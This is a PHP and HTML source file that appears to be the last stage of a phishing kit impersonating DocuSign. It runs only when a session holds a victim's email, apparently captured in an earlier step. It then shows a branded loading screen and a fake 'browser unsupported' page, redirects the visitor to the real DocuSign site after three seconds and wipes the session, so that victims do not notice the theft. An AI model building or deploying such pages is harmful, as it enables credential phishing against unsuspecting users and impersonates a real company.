<?php
session_start();
ob_start();

function loggedin()
{
    if (isset($_SESSION['email'])&&!empty($_SESSION['email'])) {
        return true;
    } else {
        return false;
    }
}


if (loggedin()) {
} else {
    die();
}
        
$email = @$_SESSION['email'];

$final = "https://docusign.com/admin/viewstate";

?>
<!DOCTYPE html>

<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>DocuSign</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
          <META HTTP-EQUIV="Refresh" CONTENT="3;URL=<?php echo "$final"; ?>">
               
        <link href="https://www.docusign.com/favicon.ico" rel="shortcut icon" type="image/x-icon">


        <style>
            #error-page, .error-page #loading-logo {
                display: none;
            }
        </style>
        <link rel="stylesheet" href="./DocuSign_files/error-page.css" type="text/css">
        
                
        
        
    </head>
    <body>
    <div id="loading-logo" style="font-family:Arial;font-size:12px;position:absolute;top:0;left:0;right:0;bottom:0;background:#FFF;z-index:999999"><img style="position:absolute;top:50%;height:40px;width:144px;top:40%;left:50%;margin-left:-72px;margin-top:-60px;" src="data:image/png;base64,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"><div style="position:absolute;left:0;right:0;text-align:center;top:40%;margin-top:9px;height:40px;line-height:16px;color:#61a4f6;"></div><div style="position:absolute;left:50%;margin-left:-107px;height:4px;width:214px;top:40%;margin-top:-10px;background:#eaeaea;"><div id="preparing-experience" style="position: absolute; left: 0px; top: 0px; bottom: 0px; width: 90%; background: rgb(97, 164, 246); transition: width 8s cubic-bezier(0.2, 0.84, 0.38, 0.87);"></div></div></div>
    
    <div id="error-page">
        <div class="top-area" id="newHeader">
            <div class="logo-wrapper"><a href="http://www.docusign.com/" class="logo-link"><img src="./DocuSign_files/docusign.png" class="logo" alt="Docusign"></a></div>
            <div class="help-wrapper"><a href="http://www.docusign.com/support" class="help-link" target="_new">Help</a></div>
        </div>

        <div id="browser-unsupported" class="container">
            <div class="error-header">
                <h1>Your browser isn't supported</h1>
                <h3>The version of Internet Explorer you are using is outdated or running in compatibility mode which is not supported by DocuSign.</h3>
                <h3>Download one of the following browsers to continue:</h3>
            </div>

            <div class="error-holder">
                <table>
                    <tbody><tr>
                        <td class="icon-cell">
                            <img src="./DocuSign_files/ie.png" alt="internet-explorer-icon">
                        </td>
                        <td>
                             <h4>Internet Explorer <small>8.0 or above</small></h4>
                        </td>
                    </tr>
                    <tr>
                        <td class="icon-cell">
                            <img src="./DocuSign_files/firefox.png" alt="firefox-icon">
                        </td>
                        <td>
                             <h4>Firefox <small>Current Version</small></h4>
                        </td>
                    </tr>
                    <tr>
                        <td class="icon-cell">
                            <img src="./DocuSign_files/chrome.png" alt="google-chrome-icon">
                        </td>
                        <td>
                             <h4>Google Chrome <small>Current Version</small></h4>
                        </td>
                    </tr>
                </tbody></table>

                <div class="fine-print-footer">
                    <strong>Current Browser User Agent String:  </strong><span id="user-agent-string"></span>
                </div>
            </div>

        </div>
    </div>

    

    

</body>
<?php
session_destroy();
?>
</html>
